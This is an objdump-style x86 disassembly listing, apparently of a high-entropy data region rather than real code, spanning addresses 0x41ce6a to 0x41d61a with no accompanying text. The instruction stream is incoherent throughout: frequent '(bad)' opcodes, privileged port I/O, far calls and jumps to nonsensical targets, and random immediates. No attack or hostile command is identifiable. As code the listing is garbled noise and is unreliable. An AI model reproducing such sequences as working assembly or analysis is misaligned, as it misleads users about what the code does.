  41ce6a:	mov    ds:0x2c05c6cd,al
  41ce6f:	lahf   
  41ce70:	add    DWORD PTR [edx+0x35c27269],ebx
  41ce76:	pop    esi
  41ce77:	aas    
  41ce78:	idiv   DWORD PTR [edx-0x49ea4363]
  41ce7e:	fwait
  41ce7f:	sub    ch,BYTE PTR [esi+0x53]
  41ce82:	(bad)  [ebx-0x10]
  41ce85:	inc    ebx
  41ce86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce87:	sub    al,0xf0
  41ce89:	and    al,0xd6
  41ce8b:	sub    DWORD PTR [edx],edi
  41ce8d:	dec    ebp
  41ce8e:	mov    edi,0x4ddfad0c
  41ce93:	in     eax,dx
  41ce94:	mov    WORD PTR ds:[ebx+0x462c5aa1],?
  41ce9b:	cli    
  41ce9c:	outs   dx,BYTE PTR ds:[esi]
  41ce9d:	lea    ecx,[esi]
  41ce9f:	pop    es
  41cea0:	test   DWORD PTR [esi-0x70531e1b],ebx
  41cea6:	sbb    al,0xf2
  41cea8:	stc    
  41cea9:	fsubr  QWORD PTR [esp+ecx*1-0x377e1816]
  41ceb0:	cwde   
  41ceb1:	pop    ds
  41ceb2:	sbb    DWORD PTR [edi+0x7],esi
  41ceb5:	rcr    BYTE PTR [esi+0x31bc5ecf],1
  41cebb:	push   ecx
  41cebc:	cmovo  esi,DWORD PTR [ecx-0x5c55be80]
  41cec3:	inc    edx
  41cec4:	inc    esp
  41cec5:	scas   al,BYTE PTR es:[edi]
  41cec6:	pusha  
  41cec7:	nop
  41cec8:	jne    0x41cf2c
  41ceca:	ds ss scas ax,WORD PTR es:[edi]
  41cece:	shl    ebx,cl
  41ced0:	fdiv   QWORD PTR [edi+eiz*4]
  41ced3:	mov    al,0x1e
  41ced5:	push   ds
  41ced6:	pop    edx
  41ced7:	scas   al,BYTE PTR es:[edi]
  41ced8:	cmp    edx,0x73
  41cedb:	push   ebp
  41cedc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cedd:	pop    esp
  41cede:	ret    
  41cedf:	or     al,al
  41cee1:	dec    edi
  41cee2:	pop    esp
  41cee3:	mov    edi,0x801e9bb5
  41cee8:	mov    ecx,0x8f3ac1d0
  41ceed:	dec    edx
  41ceee:	add    eax,DWORD PTR [ebp-0x51bcca42]
  41cef4:	mov    edi,0xa9d5f989
  41cef9:	sbb    BYTE PTR [ebp+0x1],0x5e
  41cefd:	mov    edi,0x1a0af525
  41cf02:	push   cs
  41cf03:	or     DWORD PTR [ebp+0x24],ecx
  41cf06:	or     eax,0x10763a8e
  41cf0b:	and    al,0xaf
  41cf0d:	mov    dl,0xd
  41cf0f:	test   eax,0x9693e2dc
  41cf15:	mov    ds:0x8b1813f9,al
  41cf1a:	es dec esi
  41cf1c:	sbb    DWORD PTR es:[edi-0x4742b1f7],0x7b
  41cf24:	repnz mov dh,BYTE PTR [eax]
  41cf27:	pop    es
  41cf28:	xlat   BYTE PTR ss:[ebx]
  41cf2a:	xlat   BYTE PTR ds:[ebx]
  41cf2b:	ds call 0x754e5ec6
  41cf31:	(bad)  
  41cf32:	jns    0x41cf09
  41cf34:	fstp   QWORD PTR [esi+0x6579e10d]
  41cf3a:	add    eax,0x4e270ad9
  41cf3f:	cmp    ch,dh
  41cf41:	jl     0x41cefc
  41cf43:	or     eax,0x3917425e
  41cf48:	repz int 0xd
  41cf4b:	sbb    DWORD PTR cs:[edx-0xcacbc40],esp
  41cf52:	pop    ecx
  41cf53:	dec    eax
  41cf54:	sahf   
  41cf55:	out    dx,al
  41cf56:	cmp    al,0x2b
  41cf58:	mov    BYTE PTR [ebx+ecx*8],bh
  41cf5b:	leave  
  41cf5c:	mov    ah,0x32
  41cf5e:	out    dx,al
  41cf5f:	jno    0x41cfc7
  41cf61:	jmp    0xd97781e6
  41cf66:	and    al,0xc4
  41cf68:	scas   eax,DWORD PTR es:[edi]
  41cf69:	pop    ds
  41cf6a:	jmp    0x41cf38
  41cf6c:	or     ebx,DWORD PTR [edi]
  41cf6e:	cmp    eax,0xaff90f67
  41cf73:	mov    bl,BYTE PTR [esi-0x4]
  41cf76:	call   0xbc54:0xbd1502c4
  41cf7d:	xor    eax,0xfddc953e
  41cf82:	(bad)  
  41cf83:	fisub  WORD PTR [edx]
  41cf85:	imul   ebx,DWORD PTR [edi-0x5f],0x488c299b
  41cf8c:	jmp    0xdc9:0xd3ca2d92
  41cf93:	arpl   WORD PTR [ecx+0x5f23496a],bp
  41cf99:	and    BYTE PTR [edi],bh
  41cf9b:	inc    ebx
  41cf9c:	ins    DWORD PTR es:[edi],dx
  41cf9d:	nop
  41cf9e:	adc    BYTE PTR [esi-0x80],bl
  41cfa1:	xchg   esp,eax
  41cfa2:	stos   BYTE PTR es:[edi],al
  41cfa3:	cdq    
  41cfa4:	cmp    edi,edx
  41cfa6:	dec    esi
  41cfa7:	dec    edx
  41cfa8:	lahf   
  41cfa9:	test   DWORD PTR [ecx-0x18],eax
  41cfac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfae:	mov    esi,0xe6f1e2fa
  41cfb3:	mov    eax,0xe1b3af77
  41cfb8:	and    al,0xaa
  41cfba:	enter  0xb70a,0x3c
  41cfbe:	cld    
  41cfbf:	add    BYTE PTR [esi-0x6a90586e],0x1b
  41cfc6:	in     eax,dx
  41cfc7:	xchg   esp,eax
  41cfc8:	loope  0x41cf5e
  41cfca:	addr16 jb 0x41cfc2
  41cfcd:	or     al,0x6e
  41cfcf:	cmp    cl,dh
  41cfd1:	sbb    dh,BYTE PTR [ebx]
  41cfd3:	cmp    al,0x26
  41cfd5:	cmp    esp,DWORD PTR [edi-0x4616a18d]
  41cfdb:	xor    BYTE PTR [esi+0x78704178],dh
  41cfe1:	xchg   esp,eax
  41cfe2:	and    DWORD PTR [ebx+0x69488502],eax
  41cfe8:	push   es
  41cfe9:	push   cs
  41cfea:	rcr    BYTE PTR [esi],1
  41cfec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfed:	je     0x41d001
  41cfef:	lds    edx,FWORD PTR ds:0xabc36642
  41cff5:	xchg   edx,edi
  41cff7:	cmc    
  41cff8:	push   edi
  41cff9:	or     eax,0x48103e61
  41cffe:	sub    bh,BYTE PTR [ecx]
  41d000:	mov    al,ds:0xb0f8a15d
  41d005:	and    BYTE PTR [esp+ebp*1],0x9a
  41d009:	xlat   BYTE PTR ds:[ebx]
  41d00a:	fldcw  WORD PTR [edx]
  41d00c:	push   edx
  41d00d:	test   BYTE PTR [ebp+eiz*1+0x18],dh
  41d011:	in     eax,dx
  41d012:	cmp    edi,DWORD PTR [ebx-0x6b]
  41d015:	imul   ebx,DWORD PTR [ecx+0x3],0xe2b0b901
  41d01c:	aad    0x96
  41d01e:	sbb    eax,0x47512c92
  41d023:	fwait
  41d024:	enter  0xe5cf,0xe7
  41d028:	fs ror cl,1
  41d02b:	mov    WORD PTR [edx+0x7de2b6e2],es
  41d031:	mov    ebp,0x63243f62
  41d036:	imul   eax,esp,0xb
  41d039:	mov    edi,0xff2fa462
  41d03e:	in     al,0x7f
  41d040:	jns    0x41d078
  41d042:	pop    ecx
  41d043:	inc    eax
  41d044:	mov    DWORD PTR [edx+eiz*2+0x32920cd1],ecx
  41d04b:	add    al,0x67
  41d04d:	mov    edx,0x699399d9
  41d052:	dec    eax
  41d053:	ja     0x41d05f
  41d055:	imul   esp,esi,0x12
  41d058:	sbb    al,0x45
  41d05a:	sbb    al,0x32
  41d05c:	ret    0xf6ad
  41d05f:	rol    DWORD PTR [esi],0xa6
  41d062:	fwait
  41d063:	repz inc ecx
  41d065:	pushf  
  41d066:	je     0x41d01d
  41d068:	add    DWORD PTR [esi-0x46],ebp
  41d06b:	xchg   DWORD PTR [edx],edi
  41d06d:	pop    ds
  41d06e:	jg     0x41d03f
  41d070:	add    DWORD PTR [esi-0x1459bdaf],ecx
  41d076:	pop    esi
  41d077:	lods   al,BYTE PTR ds:[esi]
  41d078:	inc    DWORD PTR [edi-0x6]
  41d07b:	push   esi
  41d07c:	mov    eax,ds:0xae21e128
  41d081:	push   esi
  41d082:	lods   eax,DWORD PTR ds:[esi]
  41d083:	je     0x41d013
  41d085:	sbb    bp,WORD PTR [ecx+edx*2-0xa7d95b4]
  41d08d:	mov    edx,0xb89cd6e1
  41d092:	inc    ebx
  41d093:	or     DWORD PTR [ebx],ebx
  41d095:	sahf   
  41d096:	leave  
  41d097:	xor    BYTE PTR [eax-0x2e75c923],bh
  41d09d:	popf   
  41d09e:	mov    ds:0x964a5505,al
  41d0a3:	fucomp st(7)
  41d0a5:	fild   DWORD PTR [ebx-0x4df91bc2]
  41d0ab:	in     eax,0xb
  41d0ad:	sub    ch,BYTE PTR [ebp-0x2d]
  41d0b0:	mov    ds:0xf1a0e8b1,eax
  41d0b5:	cwde   
  41d0b6:	jb     0x41d0a9
  41d0b8:	jl     0x41d0ad
  41d0ba:	repnz (bad) 
  41d0bc:	xchg   ecx,eax
  41d0bd:	ror    dh,1
  41d0bf:	pop    ds
  41d0c0:	pop    eax
  41d0c1:	aas    
  41d0c2:	jnp    0x41d0eb
  41d0c4:	lods   al,BYTE PTR ds:[esi]
  41d0c5:	mov    ah,0x20
  41d0c7:	cmp    ecx,0xffffffef
  41d0ca:	retf   
  41d0cb:	jmp    0xf375817a
  41d0d0:	aas    
  41d0d1:	repz sub eax,0xaf02ea7c
  41d0d7:	push   es
  41d0d8:	in     al,dx
  41d0d9:	stos   BYTE PTR es:[edi],al
  41d0da:	dec    esi
  41d0db:	lock aam 0x96
  41d0de:	jmp    0x2ddb:0xad2ef79b
  41d0e5:	repnz xchg esi,ebp
  41d0e8:	int    0x1
  41d0ea:	push   es
  41d0eb:	jnp    0x41d0b5
  41d0ed:	mov    edi,0x32f27ca0
  41d0f2:	not    BYTE PTR [edx+edx*4]
  41d0f5:	inc    esi
  41d0f6:	fst    QWORD PTR [ebx]
  41d0f8:	test   eax,0xbfe2a5c0
  41d0fd:	mov    dh,0x5d
  41d0ff:	ret    
  41d100:	in     al,dx
  41d101:	or     BYTE PTR [edx],bh
  41d103:	cmp    DWORD PTR [esi-0x29],esi
  41d106:	xchg   esp,eax
  41d107:	add    al,0x67
  41d109:	add    al,0x27
  41d10b:	jp     0x41d116
  41d10d:	dec    edi
  41d10e:	mov    esp,0x183e9baf
  41d113:	mov    WORD PTR [esp+esi*8-0x14dfc74a],?
  41d11a:	call   0x973161f6
  41d11f:	pop    edi
  41d120:	pushf  
  41d121:	xchg   ebx,eax
  41d122:	frstor [ebp-0x10d970c3]
  41d128:	lds    edi,FWORD PTR [edi+edx*1+0x894f5ca]
  41d12f:	mov    al,0xcb
  41d131:	js     0x41d138
  41d133:	call   0x6792:0x3112f4a8
  41d13a:	mov    dh,0xf5
  41d13c:	mov    BYTE PTR [ebx],ah
  41d13e:	pop    ds
  41d13f:	xchg   ecx,eax
  41d140:	mov    gs,ebp
  41d142:	not    ch
  41d144:	imul   DWORD PTR [esi+ebx*1]
  41d147:	(bad)  
  41d148:	(bad)  [eax]
  41d14a:	lods   eax,DWORD PTR ds:[esi]
  41d14b:	jge    0x41d177
  41d14d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d14e:	mov    eax,ds:0x4d05e8d8
  41d153:	in     al,dx
  41d154:	jne    0x41d190
  41d156:	mov    ecx,0x46ebf629
  41d15b:	adc    dl,BYTE PTR [edi-0x33]
  41d15e:	sbb    edx,edi
  41d160:	mov    edx,0x45ac4512
  41d165:	pop    ecx
  41d166:	ret    
  41d167:	sbb    BYTE PTR [edi-0x2],0xaa
  41d16b:	dec    edx
  41d16c:	imul   esp,DWORD PTR ds:0xba06149a,0xbc196ef9
  41d176:	bnd jnp 0x41d144
  41d179:	xor    BYTE PTR [eax],0x93
  41d17c:	mov    edx,0x277141fd
  41d181:	jp     0x41d19e
  41d183:	or     ebp,DWORD PTR ds:0xa4f197d1
  41d189:	pop    ebp
  41d18a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d18b:	cli    
  41d18c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d18d:	pusha  
  41d18e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d18f:	pop    eax
  41d190:	xor    eax,0xe2d28967
  41d195:	into   
  41d196:	imul   ebp,DWORD PTR [edi+0x20],0xffffffbf
  41d19a:	sahf   
  41d19b:	jae    0x41d1e2
  41d19d:	mov    esp,0xa2fe47ba
  41d1a2:	or     al,cl
  41d1a4:	mov    eax,0xda204c3a
  41d1a9:	jbe    0x41d217
  41d1ab:	and    ch,BYTE PTR [esp+edx*8+0x6]
  41d1af:	xchg   esi,eax
  41d1b0:	mov    ch,0x78
  41d1b2:	ss cs lahf 
  41d1b5:	loope  0x41d181
  41d1b7:	jmp    0x442d497e
  41d1bc:	mov    al,0xb0
  41d1be:	xlat   BYTE PTR ds:[ebx]
  41d1bf:	(bad)  
  41d1c0:	in     al,dx
  41d1c1:	das    
  41d1c2:	loope  0x41d19e
  41d1c4:	mov    ebp,0x9930059c
  41d1c9:	cmp    ebp,DWORD PTR [esi+0x4a8619fe]
  41d1cf:	jo     0x41d22b
  41d1d1:	push   ss
  41d1d2:	mov    bh,0x3b
  41d1d4:	cmp    al,0xa9
  41d1d6:	mov    cl,0xd9
  41d1d8:	in     eax,dx
  41d1d9:	adc    al,0xc1
  41d1db:	int3   
  41d1dc:	shr    DWORD PTR [edi],0xdf
  41d1df:	inc    ecx
  41d1e0:	jecxz  0x41d1ab
  41d1e2:	loopne 0x41d21c
  41d1e4:	pop    es
  41d1e5:	test   al,0xa1
  41d1e7:	mov    cl,0xa
  41d1e9:	sbb    edx,eax
  41d1eb:	sbb    BYTE PTR [esi+0x1d],dl
  41d1ee:	nop
  41d1ef:	mov    dh,0x18
  41d1f1:	mov    bl,0x35
  41d1f3:	mov    BYTE PTR [edi+0x3],bh
  41d1f6:	jle    0x41d18d
  41d1f8:	mov    bh,0x9c
  41d1fa:	mov    ecx,0xf179916d
  41d1ff:	adc    BYTE PTR [edi-0x751c9bbd],0xda
  41d206:	inc    edx
  41d207:	or     eax,0x52e312b9
  41d20c:	fimul  WORD PTR [ebx-0x57a63006]
  41d212:	cmc    
  41d213:	sub    BYTE PTR [ebx+0x3cc63eff],0x34
  41d21a:	out    0x43,eax
  41d21c:	loopne 0x41d233
  41d21e:	lds    eax,FWORD PTR [eax-0x44]
  41d221:	addr16 test al,0x26
  41d224:	cmp    al,ah
  41d226:	sbb    BYTE PTR [ebp-0x791a5457],ch
  41d22c:	fdivrp st(3),st
  41d22e:	fs ret 
  41d230:	dec    ecx
  41d231:	mov    bl,0x2
  41d233:	xchg   edi,eax
  41d234:	cwde   
  41d235:	xchg   DWORD PTR [edi-0x3d],esp
  41d238:	sar    DWORD PTR [edx+0x3],0x3f
  41d23c:	dec    esp
  41d23d:	mov    eax,ds:0xea0b44d9
  41d242:	scas   al,BYTE PTR es:[edi]
  41d243:	push   cs
  41d244:	enter  0xc823,0x16
  41d248:	fimul  DWORD PTR [edi+0x6f]
  41d24b:	xor    al,0xc8
  41d24d:	adc    edx,DWORD PTR [eax]
  41d24f:	push   esp
  41d250:	fadd   QWORD PTR [edx-0xafaf0af]
  41d256:	sub    cl,BYTE PTR [ecx]
  41d258:	repz (bad) 
  41d25a:	lahf   
  41d25b:	and    BYTE PTR [edi-0x784e7c99],bl
  41d261:	xchg   ecx,eax
  41d262:	ds pop esi
  41d264:	push   cs
  41d265:	inc    ecx
  41d266:	(bad)  
  41d267:	jo     0x41d214
  41d269:	fnsave [edx+0x54c81d80]
  41d26f:	fcomip st,st(1)
  41d271:	repz int3 
  41d273:	mov    bl,0xb9
  41d275:	mov    dl,0xd4
  41d277:	out    dx,al
  41d278:	dec    ebx
  41d279:	out    0x2c,eax
  41d27b:	lds    ax,DWORD PTR [ebx-0x393a5a1e]
  41d282:	push   ebx
  41d283:	es dec esi
  41d285:	lods   al,BYTE PTR ds:[esi]
  41d286:	push   ss
  41d287:	mov    bh,0xea
  41d289:	sar    DWORD PTR [edi+0x5e33b369],cl
  41d28f:	mov    ds,ebp
  41d291:	mov    al,ds:0x3de8d706
  41d296:	sbb    cl,BYTE PTR [edx-0x2625839d]
  41d29c:	call   0xdec96478
  41d2a1:	xchg   esi,eax
  41d2a2:	sbb    ecx,0xffffff94
  41d2a5:	shr    DWORD PTR [edx+0x5a734f5c],0xe0
  41d2ac:	inc    ebx
  41d2ad:	mov    ecx,0x2f7fbac9
  41d2b2:	or     DWORD PTR [ebx+0x4131c632],esi
  41d2b8:	leave  
  41d2b9:	imul   eax,DWORD PTR [ecx+0x4cb539d5],0x4158b593
  41d2c3:	xor    DWORD PTR [edi],edx
  41d2c5:	(bad)  
  41d2c6:	(bad)  
  41d2c7:	shl    DWORD PTR [eax],cl
  41d2c9:	(bad)  
  41d2ca:	clc    
  41d2cb:	mov    edi,0xaf38d2e2
  41d2d0:	mov    WORD PTR [edx+0x2053ab12],ss
  41d2d6:	test   BYTE PTR [edi],dh
  41d2d8:	dec    ebp
  41d2d9:	mov    dh,0xf6
  41d2db:	cli    
  41d2dc:	imul   eax,DWORD PTR [eax+0x4159239a],0xffffff8c
  41d2e3:	aam    0x4c
  41d2e5:	je     0x41d2ff
  41d2e7:	xchg   ebp,eax
  41d2e8:	jle    0x41d2a3
  41d2ea:	or     ebx,DWORD PTR [edi]
  41d2ec:	stos   DWORD PTR es:[edi],eax
  41d2ed:	mov    dh,0x78
  41d2ef:	jg     0x41d33c
  41d2f1:	push   0x1f
  41d2f3:	add    BYTE PTR [edx+0x400fe8b9],dh
  41d2f9:	out    0x82,eax
  41d2fb:	sub    eax,0xa46724b7
  41d300:	dec    eax
  41d301:	push   edx
  41d302:	xchg   ebx,eax
  41d303:	ss (bad) 
  41d306:	xor    ebx,DWORD PTR ds:0xdd48b902
  41d30c:	mov    ecx,0xe4a6939f
  41d311:	add    eax,0xfe37c8e
  41d316:	fadd   DWORD PTR [esi-0x43fd0b71]
  41d31c:	leave  
  41d31d:	mov    dh,0xe4
  41d31f:	test   DWORD PTR [edx+0x1d4e8507],0x4d74fd30
  41d329:	xchg   BYTE PTR [ebx],bh
  41d32b:	mov    cs,WORD PTR [ecx]
  41d32d:	inc    edi
  41d32e:	pop    edx
  41d32f:	sbb    al,0xb8
  41d331:	push   es
  41d332:	or     BYTE PTR [esi],0xb9
  41d335:	dec    edx
  41d336:	inc    DWORD PTR [ebp+0x152c12c1]
  41d33c:	sahf   
  41d33d:	mov    bl,0xf6
  41d33f:	test   DWORD PTR [ebx-0x33],esi
  41d342:	add    al,0xab
  41d344:	or     dh,bl
  41d346:	ret    0xece2
  41d349:	adc    DWORD PTR [eax-0x404b9f1a],0xffffffd3
  41d350:	scas   al,BYTE PTR es:[edi]
  41d351:	dec    esp
  41d352:	repz enter 0x614d,0xa0
  41d357:	xchg   edx,eax
  41d358:	scas   eax,DWORD PTR es:[edi]
  41d359:	test   eax,0xa56f3395
  41d35e:	push   edx
  41d35f:	aam    0x1e
  41d361:	ds push ds
  41d363:	sub    BYTE PTR [esi-0x59],0x6
  41d367:	test   eax,0xc8ca008b
  41d36c:	dec    edi
  41d36d:	lock inc edi
  41d36f:	std    
  41d370:	cs adc bl,bl
  41d373:	and    bh,BYTE PTR [edx+0x59]
  41d376:	call   0x9b37dfae
  41d37b:	push   edx
  41d37c:	or     DWORD PTR [ebp-0xfc52ae6],eax
  41d382:	ds pop esp
  41d384:	mov    ecx,0xd679a034
  41d389:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d38a:	in     al,dx
  41d38b:	sbb    BYTE PTR [edx+eiz*2],ch
  41d38e:	jbe    0x41d314
  41d390:	fsub   QWORD PTR [edi-0x1fe57fd4]
  41d396:	out    dx,eax
  41d397:	mov    ds:0x9b677d24,eax
  41d39c:	push   esp
  41d39d:	pop    es
  41d39e:	pop    ss
  41d39f:	or     BYTE PTR [esi-0x7c],ch
  41d3a2:	mov    edx,0xe227b76d
  41d3a7:	js     0x41d3bd
  41d3a9:	fs loope 0x41d3e2
  41d3ac:	fsub   DWORD PTR [esi+0x21]
  41d3af:	xchg   ecx,eax
  41d3b0:	ins    DWORD PTR es:[edi],dx
  41d3b1:	push   edx
  41d3b2:	fs push 0x2c
  41d3b5:	xlat   BYTE PTR ds:[ebx]
  41d3b6:	push   ss
  41d3b7:	sub    DWORD PTR [ebx+esi*2+0x375e925e],0x2afc45c1
  41d3c2:	sbb    al,0xf8
  41d3c4:	sbb    al,0xe8
  41d3c6:	cmp    al,0x32
  41d3c8:	push   esp
  41d3c9:	jg     0x41d413
  41d3cb:	mov    ds:0x1fdcf6ed,eax
  41d3d0:	jge    0x41d3a1
  41d3d2:	ins    DWORD PTR es:[edi],dx
  41d3d3:	ds cwde 
  41d3d5:	fiadd  WORD PTR [ebx]
  41d3d7:	dec    esp
  41d3d8:	or     ah,dh
  41d3da:	sub    eax,0x30ca6d52
  41d3df:	pop    es
  41d3e0:	cmp    dh,BYTE PTR [edx]
  41d3e2:	(bad)  
  41d3e3:	fistp  DWORD PTR [edx-0x54e164c3]
  41d3e9:	jge    0x41d438
  41d3eb:	cs in  eax,0xa1
  41d3ee:	jmp    0x87029f69
  41d3f3:	aad    0x8
  41d3f5:	retf   0xd432
  41d3f8:	and    al,0xe9
  41d3fa:	add    dl,bl
  41d3fc:	and    DWORD PTR [ebp-0x13],esi
  41d3ff:	or     edx,ebx
  41d401:	call   0x5582:0xf98995e2
  41d408:	fcmove st,st(6)
  41d40a:	add    ah,BYTE PTR [edi]
  41d40c:	frstpm(287 only) 
  41d40e:	cmp    BYTE PTR [edi],dh
  41d410:	and    ebp,0x27
  41d413:	lock mov eax,ds:0xf84ab315
  41d419:	and    DWORD PTR [eax-0x59],eax
  41d41c:	mov    ds:0x24297f9c,al
  41d421:	mov    WORD PTR [ebx+0x29805f8b],fs
  41d427:	shl    BYTE PTR fs:[ecx-0x6efb84a2],1
  41d42e:	and    cl,ah
  41d430:	popf   
  41d431:	sub    al,0xad
  41d433:	cmp    BYTE PTR [edx],cl
  41d435:	push   ebp
  41d436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d437:	les    edi,FWORD PTR [esi-0x3a]
  41d43a:	out    dx,eax
  41d43b:	mov    dh,0x12
  41d43d:	inc    esi
  41d43e:	push   edi
  41d43f:	cmc    
  41d440:	jae    0x41d41c
  41d442:	mov    esi,0x48831762
  41d447:	mov    DWORD PTR [ecx-0x5b615dd3],ebx
  41d44d:	cmovg  edx,DWORD PTR [edi]
  41d450:	push   eax
  41d451:	mov    ebp,0xd8aed899
  41d456:	and    ebx,DWORD PTR [ecx-0xb020e29]
  41d45c:	shr    esp,cl
  41d45e:	xchg   BYTE PTR [ebp+0x53],dh
  41d461:	mov    ds:0x598cada4,eax
  41d466:	int3   
  41d467:	int3   
  41d468:	test   eax,0xc9f775af
  41d46d:	dec    edi
  41d46e:	aad    0x10
  41d470:	xor    BYTE PTR [eax],ch
  41d472:	sub    eax,0xc0d5507f
  41d477:	jecxz  0x41d4cd
  41d479:	jl     0x41d4b1
  41d47b:	mov    ebx,0xa747abf
  41d480:	test   eax,0xd54fd71f
  41d485:	xor    edi,DWORD PTR [esi-0x508ba8fd]
  41d48b:	and    al,0x50
  41d48d:	loop   0x41d419
  41d48f:	push   esp
  41d490:	xchg   esi,eax
  41d491:	sti    
  41d492:	mov    ecx,0x74378fff
  41d497:	jnp    0x41d513
  41d499:	jmp    0xb82:0x6b8c0b4d
  41d4a0:	scas   eax,DWORD PTR es:[edi]
  41d4a1:	mov    ah,0xd0
  41d4a3:	sbb    al,0xd0
  41d4a5:	outs   dx,BYTE PTR ds:[esi]
  41d4a6:	or     al,0xa0
  41d4a8:	jo     0x41d487
  41d4aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4ab:	add    eax,0xa8286260
  41d4b0:	jnp    0x41d47f
  41d4b2:	inc    esi
  41d4b3:	test   BYTE PTR [edi+0x232ba00],dh
  41d4b9:	add    DWORD PTR [ebx+0x377bfe6b],esi
  41d4bf:	add    al,0x5c
  41d4c1:	xor    eax,0xed96dc46
  41d4c6:	test   eax,0xe9ca45cd
  41d4cb:	xchg   ebx,eax
  41d4cc:	out    0xd8,eax
  41d4ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4cf:	or     ebp,DWORD PTR [edi-0x58410976]
  41d4d5:	pushf  
  41d4d6:	jp     0x41d46f
  41d4d8:	adc    al,BYTE PTR [edi]
  41d4da:	and    eax,0x4e4a846d
  41d4df:	mov    BYTE PTR [edi],al
  41d4e1:	leave  
  41d4e2:	cmp    al,0x8e
  41d4e4:	fldenv [edx+eiz*8]
  41d4e7:	add    eax,0xf08c68f7
  41d4ec:	add    eax,0x70fee678
  41d4f2:	cli    
  41d4f3:	push   edi
  41d4f4:	scas   eax,DWORD PTR es:[edi]
  41d4f5:	arpl   WORD PTR [eax-0x54],cx
  41d4f8:	bound  ecx,QWORD PTR [ebp+edx*2-0x7d]
  41d4fc:	pop    edx
  41d4fd:	mov    dl,BYTE PTR [eax]
  41d4ff:	xor    BYTE PTR [esp+edx*2+0x2860e2ce],cl
  41d506:	cmp    eax,0xbe5c32b8
  41d50b:	aam    0xf6
  41d50d:	push   esi
  41d50e:	adc    al,0xb6
  41d510:	fld    QWORD PTR [eax]
  41d512:	leave  
  41d513:	loop   0x41d58d
  41d515:	inc    esp
  41d516:	lock push ss
  41d518:	mov    esp,0xad09ec87
  41d51d:	arpl   WORD PTR [eax-0xb],di
  41d520:	jecxz  0x41d4c1
  41d522:	shl    BYTE PTR [ecx],1
  41d524:	mov    edi,0x8227162c
  41d529:	in     al,0x98
  41d52b:	mov    ah,0x53
  41d52d:	loope  0x41d514
  41d52f:	aaa    
  41d530:	or     DWORD PTR [ebx+0x68],eax
  41d533:	loope  0x41d4e8
  41d535:	rcl    DWORD PTR [edx-0x51],cl
  41d538:	pusha  
  41d539:	xor    DWORD PTR [ebx-0x7a186f69],ebp
  41d53f:	or     BYTE PTR [ecx],al
  41d541:	mov    bl,0x1b
  41d543:	push   ds
  41d544:	push   0x4e
  41d546:	getsec 
  41d548:	xor    eax,0xb7c34fc7
  41d54d:	mov    eax,ds:0x3165c0b2
  41d552:	adc    BYTE PTR [eax],ch
  41d554:	jecxz  0x41d503
  41d556:	loopne 0x41d57a
  41d558:	push   edx
  41d559:	test   al,0x5b
  41d55b:	jno    0x41d527
  41d55d:	push   ss
  41d55e:	add    dl,BYTE PTR [ecx]
  41d560:	ss dec esp
  41d562:	dec    ebx
  41d563:	lods   al,BYTE PTR ds:[esi]
  41d564:	jl     0x41d540
  41d566:	cmc    
  41d567:	pop    edx
  41d568:	jne    0x41d5b6
  41d56a:	mov    ah,0x5f
  41d56c:	mov    bl,cl
  41d56e:	imul   ebx,DWORD PTR [edx-0xd610463],0xda85e0e8
  41d578:	mov    bh,0x6f
  41d57a:	(bad)  
  41d57b:	icebp  
  41d57c:	pop    ecx
  41d57d:	data16 rcr dh,0x34
  41d581:	or     ebx,DWORD PTR [ebx+eiz*4]
  41d584:	pushf  
  41d585:	aam    0x2e
  41d587:	mov    bl,0x7a
  41d589:	pop    ecx
  41d58a:	popa   
  41d58b:	and    DWORD PTR [edx-0x53c13624],0xffffffb8
  41d592:	(bad)  
  41d593:	fiadd  WORD PTR [edi+esi*4]
  41d596:	outs   dx,BYTE PTR ds:[esi]
  41d597:	and    ebp,DWORD PTR [edx+0x1ba336c7]
  41d59d:	or     al,0xbe
  41d59f:	adc    DWORD PTR ds:0xc3c00c38,edx
  41d5a5:	cmp    ch,BYTE PTR [ecx+0x64ff0c6]
  41d5ab:	jge    0x41d5af
  41d5ad:	sahf   
  41d5ae:	cmp    cl,BYTE PTR ds:0x1cf6f2d8
  41d5b4:	xchg   ebp,eax
  41d5b5:	pusha  
  41d5b6:	(bad)  
  41d5b7:	push   ecx
  41d5b8:	mov    cl,0x1c
  41d5ba:	sbb    ch,BYTE PTR [edx]
  41d5bc:	mov    edx,0x4696bfb2
  41d5c1:	or     ebp,DWORD PTR [ecx]
  41d5c3:	mov    cl,BYTE PTR [ebp-0x59a4cf31]
  41d5c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5ca:	jno    0x41d56a
  41d5cc:	iret   
  41d5cd:	xor    esp,DWORD PTR [esi-0x1d74922f]
  41d5d3:	repnz fdiv DWORD PTR [esp+ebp*1]
  41d5d7:	xlat   BYTE PTR ds:[ebx]
  41d5d8:	or     ah,BYTE PTR [ecx+esi*1+0x25]
  41d5dc:	or     BYTE PTR [eax+0x17],ch
  41d5df:	add    al,0xfd
  41d5e1:	je     0x41d58e
  41d5e3:	sbb    esi,DWORD PTR [eax-0x3d7eced8]
  41d5e9:	imul   esi,DWORD PTR [ecx+ebx*2+0x2],0xda47d25
  41d5f1:	cwde   
  41d5f2:	cdq    
  41d5f3:	punpckhwd mm1,QWORD PTR [ebx+0x44]
  41d5f7:	(bad)  
  41d5f8:	cld    
  41d5f9:	daa    
  41d5fa:	inc    edx
  41d5fb:	dec    ecx
  41d5fc:	add    bh,BYTE PTR [edi]
  41d5fe:	cmp    eax,0xbc398f8f
  41d603:	xor    bl,BYTE PTR [ebp+0x5]
  41d606:	sub    DWORD PTR [edi-0x1d677dfe],esi
  41d60c:	repz pop ecx
  41d60e:	out    dx,eax
  41d60f:	gs enter 0xef3c,0xa6
  41d614:	cmp    DWORD PTR [esi+0x5b126b19],eax
  41d61a:	xchg   DWORD PTR [ecx+0x59d4c612],ebp
